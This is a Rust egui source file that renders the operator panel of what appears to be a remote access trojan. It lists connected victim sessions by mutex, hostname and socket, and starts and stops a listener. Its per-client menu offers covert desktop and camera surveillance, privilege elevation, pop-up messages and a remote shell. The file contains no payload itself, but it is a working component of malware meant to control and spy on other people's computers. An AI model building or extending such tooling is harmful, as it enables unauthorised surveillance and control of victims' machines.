use crate::{
    manager::types::UiManagerCommand,
    ui::{client::ClientView, view::View, windows},
};
use egui::{
    Align, Frame, Id, Label, Layout, Popup, RichText, ScrollArea, Sense, TextStyle, Ui, vec2,
};
use egui_extras::{Column, TableBuilder};
use shared::commands::Command;

fn menu(view: &mut ClientView, ui: &mut Ui) -> () {
    ui.menu_button("🔍  Surveillance", |ui| {
        if ui.button("🖵  Desktop").clicked() {
            view.state
                .windows
                .screen
                .store(true, std::sync::atomic::Ordering::Relaxed);
        };
        if ui.button("📸  Camera").clicked() {
            view.state
                .windows
                .camera
                .store(true, std::sync::atomic::Ordering::Relaxed);
        };
    });
    ui.menu_button("🗁  Utility", |ui| {
        ui.add_enabled_ui(!view.elevated, |ui| {
            if ui.button("🛡  Elevate").clicked() {
                let _ = view.sender.send(UiManagerCommand::SendCommand(
                    view.mutex.clone(),
                    Command::Elevate,
                )); // #ThatWasEasy
            };
        });
        if ui.button("💬  MessageBox").clicked() {
            view.state
                .windows
                .message_box
                .store(true, std::sync::atomic::Ordering::Relaxed);
        };
        if ui.button("🗖  Shell").clicked() {
            view.state
                .windows
                .shell
                .store(true, std::sync::atomic::Ordering::Relaxed);
        };
    });
}

pub fn render(view: &mut View, ui: &mut Ui) -> () {
    ui.heading("Sessions");

    ui.horizontal(|ui| match view.state.listening {
        false => {
            if ui.button("▶  Listen").clicked() {
                let _ = view
                    .mouthpiece
                    .to_server
                    .send(crate::types::UiMessage::Listen);
            }
        }
        true => {
            if ui.button("⏹  Stop").clicked() {
                let _ = view
                    .mouthpiece
                    .to_server
                    .send(crate::types::UiMessage::Shutdown);
            }
        }
    });

    ui.add_space(6.0); // chill extra padding

    TableBuilder::new(ui)
        .column(Column::auto().at_least(128.0)) // Mutex
        .column(Column::auto().at_least(128.0)) // Hostname
        .column(Column::auto().at_least(128.0)) // Address
        .header(24.0, |mut header| {
            header.col(|ui| {
                ui.strong("Mutex");
            });
            header.col(|ui| {
                ui.strong("Hostname");
            });
            header.col(|ui| {
                ui.strong("Socket");
            });
        })
        .body(|mut body| {
            for (_i, mut client) in view.state.clients.iter_mut().enumerate() {
                body.row(24.0, |mut row| {
                    row.col(|ui| {
                        let sense = Sense::click();
                        let response = ui.add(Label::new(client.0).sense(sense));
                        Popup::menu(&response)
                            .id(Id::new("menu"))
                            .show(|ui| menu(&mut client.1, ui));
                        Popup::context_menu(&response)
                            .id(Id::new("context_menu"))
                            .show(|ui| menu(&mut client.1, ui));
                    });
                    row.col(|ui| {
                        ui.label(&client.1.info.hostname);
                    });
                    row.col(|ui| {
                        ui.label(&client.1.socket);
                    });
                });
            }
        });

    for (_i, client) in view.state.clients.iter_mut().enumerate() {
        windows::render(client.1, ui);
    }

    ui.with_layout(Layout::top_down(Align::Min), |ui| {
        let size = ui.available_size() - vec2(16.0, 16.0);
        Frame::new()
            .fill(ui.visuals().faint_bg_color)
            .corner_radius(8.0)
            .inner_margin(6.0)
            .show(ui, |ui| {
                ui.set_min_size(size);
                ScrollArea::vertical()
                    .auto_shrink([false, false])
                    .stick_to_bottom(true)
                    .show(ui, |ui| {
                        ui.label(
                            RichText::new(&view.state.logs.server.join("\n"))
                                .monospace()
                                .size(12.0)
                                .color(ui.visuals().text_color())
                                .text_style(TextStyle::Monospace),
                        )
                    })
            })
    });
}
